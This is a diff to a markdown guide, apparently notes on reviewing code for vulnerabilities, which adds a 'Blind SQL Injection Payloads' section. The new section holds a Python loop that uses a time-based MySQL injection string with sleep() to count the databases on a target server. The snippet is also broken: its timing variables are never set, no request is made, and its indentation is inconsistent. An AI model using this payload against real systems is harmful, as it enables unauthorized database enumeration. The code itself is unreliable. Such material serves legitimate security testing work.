@@ -547,8 +547,24 @@ Add the name of the Stored Procedure (without the dbo. part), then press OK.
 
 ### 4) Try to find where the Stored Procedure is called within the code.
 
-### 5) Check which function is located, check variables, and where is it called by clicking on:
+### 5) Check which function is located, check variables, and where it is called by clicking on:
 
     References
 
 ### 6) Try to reproduce the vulnerability.
+
+## Blind SQL Injection Payloads
+
+### 1) Python Code Snippets
+
+Enumerate the number of databases
+
+    i = 1
+    while True:
+        payload = generatePayload("0", "-13.37' or IF((SELECT COUNT(*) FROM information_schema.SCHEMATA)=" + str(i) + ", sleep(1),FALSE) or '2'='1")
+
+        if (t2 - t1 > 1):
+                    print("Number of databases on server: " + str(i))
+                    break
+                else:
+                    i = i + 1
